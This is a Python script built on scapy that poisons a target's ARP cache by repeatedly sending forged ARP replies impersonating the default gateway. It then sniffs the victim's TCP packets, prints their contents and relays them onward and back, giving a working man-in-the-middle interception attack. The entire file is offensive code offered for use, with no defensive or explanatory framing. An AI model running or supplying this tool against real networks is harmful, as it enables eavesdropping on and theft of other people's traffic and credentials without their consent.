import signal, sys, threading
from scapy.all import *
from time import sleep

# 
def poison():	
	ip_to_infect = sys.argv[1]
	ip_to_infect_v6 = sys.argv[2] 
	default_gateway = sys.argv[3] 
	my_ip_v6 = Ether().src
	poison_packet = ARP(hwsrc=my_ip_v6,hwdst=ip_to_infect_v6, pdst=ip_to_infect,psrc=default_gateway, op=2)
	print("[+] Poisoning %s" % (ip_to_infect))
	count = 0
	while True:
		count += 1
		sr1(poison_packet, timeout=1, verbose=False)
		if count % 5 == 0:
			print("[+] Poisoning going on... #%s." % (count))
		sleep(1)
			
def poison_wrapper():
	t = threading.Thread(target=poison)
	t.daemon = True
	t.start()

def sniff_with_ip(ip):
	signal.signal(signal.SIGINT, end)
	while True:
		print("Sniffing " + ip + "...")
		packet = sniff(lfilter= lambda pack: (IP in pack and pack[IP].src == ip and TCP in pack), count=1)
		print("Packet contents: \n")
		packet.show()
		packet[IP].src = IP().src
		resp = sr1(packet, verbose=0)
		resp[IP].dst = ip
		send(resp, verbose=0)
	
def main():
	if (len(sys.argv) < 4):
		raise Exception("Usage: %s <IP> <IPV6> <default gateway>".format(sys.argv[0]))
	poison_wrapper()
	sniff_with_ip(sys.argv[1])

def end(sig, frame):	
	print("Ending poisoning...")
	sys.exit(0)

if __name__ == "__main__":
	main()
